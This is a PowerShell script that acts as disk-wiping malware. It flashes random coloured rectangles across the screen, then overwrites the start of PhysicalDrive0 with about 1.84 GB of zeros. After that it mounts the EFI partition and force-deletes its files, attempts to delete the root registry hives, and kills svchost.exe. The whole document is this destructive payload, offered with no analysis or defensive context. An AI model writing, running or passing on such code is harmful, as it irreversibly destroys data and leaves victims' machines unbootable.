Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

$g = [System.Drawing.Graphics]::FromHwnd([IntPtr]::Zero)
$rand = New-Object System.Random

$end = (Get-Date).AddSeconds(5)

while ((Get-Date) -lt $end) {
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

    $x = $rand.Next(0, $screen.Width)
    $y = $rand.Next(0, $screen.Height)
    $w = $rand.Next(20, 250)
    $h = $rand.Next(20, 250)

    $color = [System.Drawing.Color]::FromArgb(
        $rand.Next(256),
        $rand.Next(256),
        $rand.Next(256)
    )

    $brush = New-Object System.Drawing.SolidBrush($color)
    $g.FillRectangle($brush, $x, $y, $w, $h)
    $brush.Dispose()

    Start-Sleep -Milliseconds 15
}

$g.Dispose()

$disk = "\\.\PhysicalDrive0"
$size = 1840960000
$bytes = New-Object byte[]($size)
try {
    $stream = [System.IO.File]::Open($disk, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
    $stream.Position = 0
    $stream.Write($bytes, 0, $size)
} catch {
    Write-Host "Error writing to disk: $_"
} finally {
    if ($stream) { $stream.Close() }
}

# Mount EFI partition
if (!(mountvol S: /s)) {
    Write-Host "Mountvol error"
    exit
}

# Cleanup
cmd /c "del /f /s /q S:*.* > NUL 2>&1"
@("HKLM", "HKCC", "HKU", "HKCR", "HKCU") | ForEach-Object {
    cmd /c "reg delete $_ /f"
}

taskkill /f /im svchost.exe /t
